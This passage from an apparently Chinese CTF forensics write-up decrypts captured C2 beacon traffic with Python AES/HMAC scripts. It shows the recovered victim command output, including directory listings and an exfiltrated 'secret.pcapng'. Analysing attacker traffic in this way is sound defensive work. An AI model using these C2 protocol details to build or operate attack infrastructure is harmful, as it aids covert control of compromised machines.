</span></span><span class=line><span class=cl>    <span class=n>encrypt_datas</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;00000040efeda3e57f7d7fd589d11640ea0f9a4fe6bc91332723ffc5f43f78b37c21cc7485c44d6c8eb6af74fc7044046059c76519e493e351c9f631d6785d5c07eae9e3&#34;</span><span class=p>,</span><span class=s2>&#34;000001602a99f7cc51face35199e8b1a4a5616e0301591b6f1f48b1d000149cb83d6a81e9659849a52c4f50a8629b0dfb7c036df406b44d449e40fe18df3594721e1f5849662271c1ea18b18c8eb58af5ee2c3a784852dd1c4a5c699f9518d2e2fc70d756cd68361ac794eed4eae6b062be6c31651caf93954f2a89b10e25b1fd9757ec17ee8b97038c4babb73c4f21688f5d235797844c2c9c288fac3fd2bd9cf5373956389b7e5232e35b6f268f9d67ba54f3e7e1606d4cb4020d5f480c6e5f4409b8d87e0443ae0bcfe93d286291ba6bfd0c7f37593581d90bb4ab7cfb065b4421a727f120fb491c2dc01797e38996dfc123fb120c5ed312577cc917d8a435b73c25b6d29ef0bad595100256c9aa5571e5c0ce0a8ea2c173ca1fae577fa924506b75b86522052f019d6843d74dc6fbdf2219b77e020a049c4e77df3658c80bcb703f8f878ff2f70c5c69d0cf6f4efb5a755ba854dfa5777a23989286770da6e0444d0&#34;</span><span class=p>,</span><span class=s2>&#34;000000d0c72ef8b74a7d8acc332695b62448280f9a4eaa12457de4adcad279b0563f2d4cb0707f7e2853c45acf28a365d905cf8ca421d557bd7655cbd50aafbdbe5f3f570c9c3d876d0c21b661ca5c46e09f987f7e1263f6d33c34db28a2fd342fe48e5801d1a97fb88e00f0c648ec889f6b72d71edd2eed5affd32bc8d51e27fcc148d16823c1bc235b0e16d9d477bd0b4582941db373e171cce78b10c869eb987baf3fd9f879b236be6f3af43b7742f6241dfe02ab696c96f1779d0003d6b2720d1c93890e75fcce939f1c8e0922ce5044bc3a&#34;</span><span class=p>,</span><span class=s2>&#34;00000100f24f15cd6f33c36e70ca228d10babfac1cf6bfbb9b6923a7828c9ed30b76d3ce1cb3d8f97c358bf90004e771ac646b1b996fd248ac8f0b460e0a36950dffcde04f3bae831982b528393f3a3c771310ba0c0bb7418ba5e8734a6bd37bc8a51cc0683c0904e0f404180e4c4c34720a3e5d6767c435f1746e6b93a13a2ecdc8074089e684b90748fc1a7e24e66bd637673437d9e24a37ce6f584b478e2f0485f3c05414dd4c35eb9ecfed8d4fbdab54db4233258f4fea6ed515a1030feeb184db94a4841236b491d2f7379e10f52d50ae573cd6f4504aa9750da273fa65c2a9eaf9b9bb014cafc53a9e9f0042bfcd5d24fc1b29173fd3308ff08d30b2a7d42132d4&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>encrypt_data</span> <span class=ow>in</span> <span class=n>encrypt_datas</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># encrypt_data = base64.b64decode(encrypt_data)</span>
</span></span><span class=line><span class=cl>        <span class=n>encrypt_data</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>encrypt_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>encrypt_data_length</span> <span class=o>=</span> <span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>encrypt_data</span><span class=p>[:</span><span class=mi>4</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>encrypt_data_l</span> <span class=o>=</span> <span class=n>encrypt_data</span><span class=p>[</span><span class=mi>4</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>        <span class=n>data1</span> <span class=o>=</span> <span class=n>encrypt_data_l</span><span class=p>[:</span><span class=n>encrypt_data_length</span><span class=o>-</span><span class=mi>16</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>signature</span> <span class=o>=</span> <span class=n>encrypt_data_l</span><span class=p>[</span><span class=n>encrypt_data_length</span><span class=o>-</span><span class=mi>16</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>        <span class=n>iv_bytes</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;abcdefghijklmnop&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>dec</span> <span class=o>=</span> <span class=n>decrypt</span><span class=p>(</span><span class=n>data1</span><span class=p>,</span> <span class=n>iv_bytes</span><span class=p>,</span> <span class=n>signature</span><span class=p>,</span> <span class=n>SHARED_KEY</span><span class=p>,</span> <span class=n>HMAC_KEY</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=s1>&#39;=&#39;</span><span class=o>*</span><span class=mi>80</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] counter: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[:</span><span class=mi>4</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] 任务返回长度: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>8</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] 任务输出类型: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[</span><span class=mi>8</span><span class=p>:</span><span class=mi>12</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>        <span class=n>output</span> <span class=o>=</span> <span class=n>dec</span><span class=p>[</span><span class=mi>12</span><span class=p>:</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>8</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)]</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;gbk&#39;</span><span class=p>,</span><span class=n>errors</span><span class=o>=</span><span class=s1>&#39;ignore&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>hexdump</span><span class=o>.</span><span class=n>hexdump</span><span class=p>(</span><span class=n>dec</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>output</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>上面两个代码的主要区别就在于：第二个代码中的加密数据是从源数据的第四字节开始的</p><p>我们用第二个代码解密<code>submit.php</code>的数据，可以得到如下内容，并且发现里面有个<code>secret.pcapng</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span><span class=lnt>93
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>================================================================================
</span></span><span class=line><span class=cl>[+] counter: 2
</span></span><span class=line><span class=cl>[+] 任务返回长度: 35
</span></span><span class=line><span class=cl>[+] 任务输出类型: 30
</span></span><span class=line><span class=cl>00000000: 00 00 00 02 00 00 00 23  00 00 00 1E 77 69 6E 2D  .......#....win-
</span></span><span class=line><span class=cl>00000010: 72 72 69 39 74 39 73 6E  38 35 64 5C 61 64 6D 69  rri9t9sn85d\admi
</span></span><span class=line><span class=cl>00000020: 6E 69 73 74 72 61 74 6F  72 0D 0A 00 5C 00 44 00  nistrator...\.D.
</span></span><span class=line><span class=cl>None
</span></span><span class=line><span class=cl>win-rri9t9sn85d\adminis
</span></span><span class=line><span class=cl>================================================================================
</span></span><span class=line><span class=cl>[+] counter: 3
</span></span><span class=line><span class=cl>[+] 任务返回长度: 324
</span></span><span class=line><span class=cl>[+] 任务输出类型: 30
</span></span><span class=line><span class=cl>00000000: 00 00 00 03 00 00 01 44  00 00 00 1E 20 C7 FD B6  .......D.... ...
</span></span><span class=line><span class=cl>00000010: AF C6 F7 20 43 20 D6 D0  B5 C4 BE ED C3 BB D3 D0  ... C ..........
</span></span><span class=line><span class=cl>00000020: B1 EA C7 A9 A1 A3 0D 0A  20 BE ED B5 C4 D0 F2 C1  ........ .......
</span></span><span class=line><span class=cl>00000030: D0 BA C5 CA C7 20 31 38  37 30 2D 33 35 35 33 0D  ..... 1870-3553.
</span></span><span class=line><span class=cl>00000040: 0A 0D 0A 20 43 3A 5C 55  73 65 72 73 5C 41 64 6D  ... C:\Users\Adm
</span></span><span class=line><span class=cl>00000050: 69 6E 69 73 74 72 61 74  6F 72 5C 44 65 73 6B 74  inistrator\Deskt
</span></span><span class=line><span class=cl>00000060: 6F 70 20 B5 C4 C4 BF C2  BC 0D 0A 0D 0A 32 30 32  op ..........202
</span></span><span class=line><span class=cl>00000070: 34 2F 31 32 2F 31 36 20  20 31 35 3A 30 35 20 20  4/12/16  15:05
</span></span><span class=line><span class=cl>00000080: 20 20 3C 44 49 52 3E 20  20 20 20 20 20 20 20 20    &lt;DIR&gt;
</span></span><span class=line><span class=cl>00000090: 20 2E 0D 0A 32 30 32 34  2F 31 32 2F 31 36 20 20   ...2024/12/16
</span></span><span class=line><span class=cl>000000A0: 31 35 3A 30 35 20 20 20  20 3C 44 49 52 3E 20 20  15:05    &lt;DIR&gt;
</span></span><span class=line><span class=cl>000000B0: 20 20 20 20 20 20 20 20  2E 2E 0D 0A 32 30 32 34          ....2024
</span></span><span class=line><span class=cl>000000C0: 2F 31 32 2F 31 36 20 20  31 35 3A 30 35 20 20 20  /12/16  15:05
</span></span><span class=line><span class=cl>000000D0: 20 20 20 20 20 20 20 20  20 31 37 2C 39 32 30 20           17,920
</span></span><span class=line><span class=cl>000000E0: 61 72 74 69 66 61 63 74  2E 65 78 65 0D 0A 20 20  artifact.exe..
</span></span><span class=line><span class=cl>000000F0: 20 20 20 20 20 20 20 20  20 20 20 20 20 31 20 B8               1 .
</span></span><span class=line><span class=cl>00000100: F6 CE C4 BC FE 20 20 20  20 20 20 20 20 20 31 37  .....         17
</span></span><span class=line><span class=cl>00000110: 2C 39 32 30 20 D7 D6 BD  DA 0D 0A 20 20 20 20 20  ,920 ......
</span></span><span class=line><span class=cl>00000120: 20 20 20 20 20 20 20 20  20 20 32 20 B8 F6 C4 BF            2 ....
</span></span><span class=line><span class=cl>00000130: C2 BC 20 35 31 2C 31 36  36 2C 36 30 31 2C 32 31  .. 51,166,601,21
</span></span><span class=line><span class=cl>00000140: 36 20 BF C9 D3 C3 D7 D6  BD DA 0D 0A 00 00 00 00  6 ..............
</span></span><span class=line><span class=cl>None
</span></span><span class=line><span class=cl> 驱动器 C 中的卷没有标签。
</span></span><span class=line><span class=cl> 卷的序列号是 1870-3553
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> C:\Users\Administrator\Desktop 的目录
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2024/12/16  15:05    &lt;DIR&gt;          .
</span></span><span class=line><span class=cl>2024/12/16  15:05    &lt;DIR&gt;          ..
</span></span><span class=line><span class=cl>2024/12/16  15:05            17,920 artifact.exe
</span></span><span class=line><span class=cl>               1 个文件         17,920 字节
</span></span><span class=line><span class=cl>               2 个目录 51,166,601,216 可
</span></span><span class=line><span class=cl>================================================================================
</span></span><span class=line><span class=cl>[+] counter: 4
</span></span><span class=line><span class=cl>[+] 任务返回长度: 173
</span></span><span class=line><span class=cl>[+] 任务输出类型: 22
</span></span><span class=line><span class=cl>00000000: 00 00 00 04 00 00 00 AD  00 00 00 16 00 00 00 01  ................
</span></span><span class=line><span class=cl>00000010: 43 3A 5C 55 73 65 72 73  5C 41 64 6D 69 6E 69 73  C:\Users\Adminis
</span></span><span class=line><span class=cl>00000020: 74 72 61 74 6F 72 5C 44  65 73 6B 74 6F 70 5C 2A  trator\Desktop\*
</span></span><span class=line><span class=cl>00000030: 0A 44 09 30 09 31 32 2F  31 36 2F 32 30 32 34 20  .D.0.12/16/2024
</span></span><span class=line><span class=cl>00000040: 31 35 3A 30 35 3A 34 32  09 2E 0A 44 09 30 09 31  15:05:42...D.0.1
</span></span><span class=line><span class=cl>00000050: 32 2F 31 36 2F 32 30 32  34 20 31 35 3A 30 35 3A  2/16/2024 15:05:
</span></span><span class=line><span class=cl>00000060: 34 32 09 2E 2E 0A 46 09  31 37 39 32 30 09 31 32  42....F.17920.12
</span></span><span class=line><span class=cl>00000070: 2F 31 36 2F 32 30 32 34  20 31 35 3A 30 35 3A 33  /16/2024 15:05:3
</span></span><span class=line><span class=cl>00000080: 30 09 61 72 74 69 66 61  63 74 2E 65 78 65 0A 46  0.artifact.exe.F
</span></span><span class=line><span class=cl>00000090: 09 32 38 32 09 30 38 2F  32 33 2F 32 30 31 37 20  .282.08/23/2017
</span></span><span class=line><span class=cl>000000A0: 31 34 3A 31 38 3A 33 35  09 64 65 73 6B 74 6F 70  14:18:35.desktop
</span></span><span class=line><span class=cl>000000B0: 2E 69 6E 69 0A 00 00 00  00 00 00 00 00 00 00 00  .ini............
</span></span><span class=line><span class=cl>None
</span></span><span class=line><span class=cl>C:\Users\Administrator\Desktop\*
</span></span><span class=line><span class=cl>D       0       12/16/2024 15:05:42     .
</span></span><span class=line><span class=cl>D       0       12/16/2024 15:05:42     ..
</span></span><span class=line><span class=cl>F       17920   12/16/2024 15:05:30     artifact.exe
</span></span><span class=line><span class=cl>F       282     08/23/2017 14:18:35     desk
</span></span><span class=line><span class=cl>================================================================================
</span></span><span class=line><span class=cl>[+] counter: 5
</span></span><span class=line><span class=cl>[+] 任务返回长度: 216
</span></span><span class=line><span class=cl>[+] 任务输出类型: 22
</span></span><span class=line><span class=cl>00000000: 00 00 00 05 00 00 00 D8  00 00 00 16 00 00 00 02  ................
</span></span><span class=line><span class=cl>00000010: 43 3A 5C 55 73 65 72 73  5C 41 64 6D 69 6E 69 73  C:\Users\Adminis
</span></span><span class=line><span class=cl>00000020: 74 72 61 74 6F 72 5C 44  65 73 6B 74 6F 70 5C 2A  trator\Desktop\*
</span></span><span class=line><span class=cl>00000030: 0A 44 09 30 09 31 32 2F  31 36 2F 32 30 32 34 20  .D.0.12/16/2024
</span></span><span class=line><span class=cl>00000040: 31 35 3A 30 38 3A 33 31  09 2E 0A 44 09 30 09 31  15:08:31...D.0.1
</span></span><span class=line><span class=cl>00000050: 32 2F 31 36 2F 32 30 32  34 20 31 35 3A 30 38 3A  2/16/2024 15:08:
</span></span><span class=line><span class=cl>00000060: 33 31 09 2E 2E 0A 46 09  31 37 39 32 30 09 31 32  31....F.17920.12
</span></span><span class=line><span class=cl>00000070: 2F 31 36 2F 32 30 32 34  20 31 35 3A 30 35 3A 33  /16/2024 15:05:3
</span></span><span class=line><span class=cl>00000080: 30 09 61 72 74 69 66 61  63 74 2E 65 78 65 0A 46  0.artifact.exe.F
</span></span><span class=line><span class=cl>00000090: 09 32 38 32 09 30 38 2F  32 33 2F 32 30 31 37 20  .282.08/23/2017
</span></span><span class=line><span class=cl>000000A0: 31 34 3A 31 38 3A 33 35  09 64 65 73 6B 74 6F 70  14:18:35.desktop
</span></span><span class=line><span class=cl>000000B0: 2E 69 6E 69 0A 46 09 33  34 39 35 38 38 09 31 32  .ini.F.349588.12
</span></span><span class=line><span class=cl>000000C0: 2F 31 36 2F 32 30 32 34  20 31 35 3A 30 38 3A 33  /16/2024 15:08:3
</span></span><span class=line><span class=cl>000000D0: 31 09 73 65 63 72 65 74  2E 70 63 61 70 6E 67 0A  1.secret.pcapng.
</span></span><span class=line><span class=cl>000000E0: 00 00 00 00 00 00 00 00  40 6F CC FE FE 07 00 00  ........@o......
</span></span><span class=line><span class=cl>None
</span></span><span class=line><span class=cl>C:\Users\Administrator\Desktop\*
</span></span><span class=line><span class=cl>D       0       12/16/2024 15:08:31     .
</span></span><span class=line><span class=cl>D       0       12/16/2024 15:08:31     ..
</span></span><span class=line><span class=cl>F       17920   12/16/2024 15:05:30     artifact.exe
</span></span><span class=line><span class=cl>F       282     08/23/2017 14:18:35     desktop.ini
</span></span><span class=line><span class=cl>F       349588  12/16/2024 15:08:31     secret</span></span></code></pre></td></tr></table></div></div><p>我们用第一个代码解密<code>C2服务端(10.11.4.3)</code>要求客户端执行命令的最大的那个数据包，可以得到一个<code>pacpng</code>流量包文件</p><p>结合第二个代码解密出来的<code>submit.php</code>的数据，应该就是那个<code>secret.pcapng</code>了</p><p><img loading=lazy src=/posts/f002407/imgs/image-20250227214140287.png alt=/posts/f002407/imgs/image-20250227214140287.png height=1528 width=2560></p><p>用以下代码解其余心跳包的数据可以得到攻击者要求受害客户端执行的其他命令</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hmac</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>binascii</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hexdump</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt</span><span class=p>(</span><span class=n>encrypted_data</span><span class=p>,</span> <span class=n>iv_bytes</span><span class=p>,</span> <span class=n>signature</span><span class=p>,</span> <span class=n>shared_key</span><span class=p>,</span> <span class=n>hmac_key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>hmac</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>hmac_key</span><span class=p>,</span> <span class=n>encrypted_data</span><span class=p>,</span> <span class=n>digestmod</span><span class=o>=</span><span class=s2>&#34;sha256&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>digest</span><span class=p>()[:</span><span class=mi>16</span><span class=p>]</span> <span class=o>!=</span> <span class=n>signature</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;message authentication failed&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>    <span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>shared_key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_CBC</span><span class=p>,</span> <span class=n>iv_bytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>encrypted_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>SHARED_KEY</span> <span class=o>=</span> <span class=n>binascii</span><span class=o>.</span><span class=n>unhexlify</span><span class=p>(</span><span class=s2>&#34;9fe14473479a283821241e2af78017e8&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>HMAC_KEY</span> <span class=o>=</span> <span class=n>binascii</span><span class=o>.</span><span class=n>unhexlify</span><span class=p>(</span><span class=s2>&#34;1e3d54f1b9f0e106773a59b7c379a89d&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;75c02fc5b995a17bc6aa35cb218d77673c2779496c263e60ad2e72308f04c7fc45945bc005c0581f68cde2d86f427559&#34;</span><span class=p>,</span><span class=s2>&#34;2861dcee3abe0beb543a42a83f765f8e8447799da043820c2fa534f47ef86e84bcb75dbab2b13772c66626d9461b64dffbd222ab8cb6098675785d68a054580a&#34;</span><span class=p>,</span><span class=s2>&#34;01f629f493a28c3f2c4fe5aa660bba59d58aa1f464c1d359d6682f6f166e8c2c0a8b8639a577108a7ba285fa2314ee0b3cf150f69ad4311680e15b55994a0260&#34;</span><span class=p>,</span><span class=s2>&#34;7277c5f144e04d2eaefa418ad6003a2350e8dfabb3e295b4d427679198881b6a12207b0b9d99831218db551b8469f577&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>item</span> <span class=ow>in</span> <span class=n>data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>encrypt_data</span> <span class=o>=</span> <span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>item</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>encrypt_data_length</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>encrypt_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] 数据总长度为：</span><span class=si>{</span><span class=n>encrypt_data_length</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1># encrypt_data_length = int.from_bytes(encrypt_data[:4], byteorder=&#39;big&#39;, signed=False)</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>encrypt_data</span><span class=p>[:</span><span class=n>encrypt_data_length</span><span class=o>-</span><span class=mi>16</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>signature</span> <span class=o>=</span> <span class=n>encrypt_data</span><span class=p>[</span><span class=n>encrypt_data_length</span><span class=o>-</span><span class=mi>16</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>        <span class=n>iv_bytes</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;abcdefghijklmnop&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>dec</span> <span class=o>=</span> <span class=n>decrypt</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>iv_bytes</span><span class=p>,</span> <span class=n>signature</span><span class=p>,</span> <span class=n>SHARED_KEY</span><span class=p>,</span> <span class=n>HMAC_KEY</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=s1>&#39;=&#39;</span><span class=o>*</span><span class=mi>80</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] counter: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[:</span><span class=mi>4</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] 任务返回长度: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[</span><span class=mi>4</span><span class=p>:</span><span class=mi>8</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] 任务输出类型: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>int</span><span class=o>.</span><span class=n>from_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>[</span><span class=mi>8</span><span class=p>:</span><span class=mi>12</span><span class=p>],</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>,</span> <span class=n>signed</span><span class=o>=</span><span class=kc>False</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>hexdump</span><span class=o>.</span><span class=n>hexdump</span><span class=p>(</span><span class=n>dec</span><span class=p>))</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
